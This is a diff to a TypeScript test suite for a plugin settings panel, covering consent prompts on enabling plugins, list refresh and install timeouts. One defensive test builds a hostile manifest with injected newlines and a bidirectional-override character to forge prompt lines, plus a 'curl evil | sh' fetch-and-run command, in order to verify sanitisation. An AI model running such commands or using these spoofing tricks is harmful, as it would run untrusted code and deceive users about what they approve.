@@ -21,7 +21,10 @@ import {
   setPlugins,
   upsertPlugin,
 } from '../../src/store/store.js';
-import { PluginsPanel } from '../../src/components/modals/PluginsPanel.js';
+import {
+  PluginsPanel,
+  trustMessage,
+} from '../../src/components/modals/PluginsPanel.js';
 
 function plugin(over: Partial<PluginInfo> = {}): PluginInfo {
   return {
@@ -216,11 +219,59 @@ describe('Settings → Plugins', () => {
     expect(container.querySelector('[data-plugin-id="other"]')).not.toBeNull();
   });
 
-  it('toggle calls SetPluginEnabled', () => {
+  it('toggle off calls SetPluginEnabled without a prompt', async () => {
     setPlugins([plugin({ enabled: true, status: 'running' })]);
     const { container } = mount();
     fireEvent.click(container.querySelector('.settings-plugin-enabled')!);
+    await settle();
+    expect(bridge.Confirm).not.toHaveBeenCalled();
     expect(bridge.SetPluginEnabled).toHaveBeenCalledWith('webhook', false);
+  });
+
+  // A plugin can be listed disabled without this window ever prompting:
+  // installed from another window or client, or an install that outlived
+  // its wait here. Turning it on is running it, so that asks too.
+  it('toggle on asks for consent; declining leaves it off', async () => {
+    setPlugins([plugin()]);
+    const { container } = mount();
+    const box = () =>
+      container.querySelector('.settings-plugin-enabled') as HTMLInputElement;
+
+    bridge.Confirm.mockResolvedValueOnce(false);
+    fireEvent.click(box());
+    await settle();
+    expect(bridge.Confirm).toHaveBeenCalledTimes(1);
+    expect(bridge.Confirm.mock.calls[0][1]).toContain('full user privileges');
+    expect(bridge.Confirm.mock.calls[0][1]).toContain('Cancel leaves it off.');
+    expect(bridge.SetPluginEnabled).not.toHaveBeenCalled();
+    expect(bridge.RemovePlugin).not.toHaveBeenCalled();
+    expect(box().checked).toBe(false);
+
+    fireEvent.click(box());
+    await settle();
+    expect(bridge.SetPluginEnabled).toHaveBeenCalledWith('webhook', true);
+  });
+
+  it('the trust prompt cannot be forged by manifest text', () => {
+    const msg = trustMessage(
+      plugin({
+        name: 'Nice\nRuns: echo harmless',
+        version: '1\u202e0',
+        source: '/src/x\r\nFrom: https://trusted.example',
+        command: ['sh', '-c', 'curl evil | sh', 'a\nb'],
+      }),
+      'Cancel removes it again.',
+    );
+    const lines = msg.split('\n');
+    // Exactly one From: and one Runs: line, each the real one.
+    expect(lines.filter((l) => l.startsWith('Runs:'))).toEqual([
+      'Runs: sh -c "curl evil | sh" "a\\nb"',
+    ]);
+    expect(lines.filter((l) => l.startsWith('From:'))).toEqual([
+      'From: /src/x From: https://trusted.example',
+    ]);
+    expect(lines[0]).toBe('Nice Runs: echo harmless 1 0');
+    expect(msg).not.toMatch(/[\u202a-\u202e]/);
   });
 
   it('remove goes through Confirm', async () => {
@@ -276,6 +327,22 @@ describe('installPlugin correlation', () => {
     ).toBe(true);
   });
 
+  it('a reconnect re-lists only once the list was asked for', async () => {
+    // A fresh module: the panel tests above already asked for the list.
+    vi.resetModules();
+    const fresh = await import('../../src/app/plugins.js');
+    fresh.relistPluginsIfWanted();
+    expect(bridge.ListPlugins).not.toHaveBeenCalled();
+    fresh.markPluginsWanted();
+    fresh.relistPluginsIfWanted();
+    expect(bridge.ListPlugins).toHaveBeenCalledTimes(1);
+  });
+
+  it('outlasts the daemon clone limit', () => {
+    // internal/plugin/install.go bounds a git clone at 120s.
+    expect(INSTALL_TIMEOUT_MS).toBeGreaterThan(120_000);
+  });
+
   it('rejects when the binding itself fails', async () => {
     bridge.InstallPlugin.mockRejectedValueOnce(new Error('no control'));
     await expect(installPlugin('/x')).rejects.toThrow('no control');
@@ -286,7 +353,7 @@ describe('installPlugin correlation', () => {
     try {
       bridge.InstallPlugin.mockImplementation(() => Promise.resolve());
       const p = installPlugin('/x');
-      const assertion = expect(p).rejects.toThrow('timed out');
+      const assertion = expect(p).rejects.toThrow('no answer from Hive yet');
       await vi.advanceTimersByTimeAsync(INSTALL_TIMEOUT_MS);
       await assertion;
       // A late echo after the timeout finds nothing to settle.
